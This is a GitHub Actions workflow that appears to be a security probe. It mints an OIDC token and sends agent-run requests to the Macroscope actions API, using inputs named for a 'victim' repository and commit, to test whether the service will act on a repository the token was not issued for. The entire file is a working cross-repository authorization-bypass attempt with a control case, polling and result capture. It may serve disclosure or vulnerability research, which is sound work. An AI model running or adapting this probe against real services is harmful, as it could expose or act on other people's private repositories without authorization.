name: macroscope-oidc-probe
on:
  workflow_dispatch:
    inputs:
      victim_repo:
        description: "Victim repo (owner/name)"
        required: true
      victim_sha:
        description: "HEAD SHA of victim repo"
        required: true
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Mint OIDC and run probes
        env:
          VICTIM_REPO: ${{ inputs.victim_repo }}
          VICTIM_SHA: ${{ inputs.victim_sha }}
        run: |
          set -u
          mkdir -p probe-out
          OIDC_JSON=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=macroscope")
          TOKEN=$(echo "$OIDC_JSON" | jq -r .value)
          echo "::add-mask::$TOKEN"
          echo "$TOKEN" | python3 -c "import sys,base64,json; p=sys.stdin.read().strip().split('.')[1]; p += '=' * (-len(p) % 4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))" > probe-out/oidc-claims.json || true
          cat probe-out/oidc-claims.json
          API=https://actions.macroscope.com
          start() {
            name=$1; repo=$2; commit=$3
            payload=$(jq -n --arg r "$repo" --arg c "$commit" '{repository:$r, review:{kind:"cra"}, agent:"Probe", commit:$c, idempotencyDiscriminator:"probe"}')
            echo "=== $name payload: $payload"
            code=$(curl -s -o "probe-out/$name.json" -w "%{http_code}" -X POST "$API/api/v1/github-actions/agent-runs" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "X-Macroscope-Action-Version: probe-1" --data-binary "$payload")
            echo "=== $name HTTP $code"; cat "probe-out/$name.json"; echo
            if [ "$code" = "202" ]; then
              runid=$(jq -r .runId "probe-out/$name.json"); jt=$(jq -r .jobToken "probe-out/$name.json")
              for i in 1 2 3 4 5 6; do
                sleep 10
                pcode=$(curl -s -o "probe-out/$name-poll.json" -w "%{http_code}" "$API/api/v1/github-actions/agent-runs/$runid" -H "Authorization: Bearer $jt")
                echo "--- $name poll $i HTTP $pcode"; cat "probe-out/$name-poll.json"; echo
                st=$(jq -r .status "probe-out/$name-poll.json" 2>/dev/null)
                case "$st" in succeeded|failed|cancelled) break;; esac
              done
            fi
          }
          start control "$GITHUB_REPOSITORY" "$GITHUB_SHA"
          start test-repo "$VICTIM_REPO" "$VICTIM_SHA"
          start test-commit "$GITHUB_REPOSITORY" "$VICTIM_SHA"
      - name: Upload probe output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: probe-out
          path: probe-out/
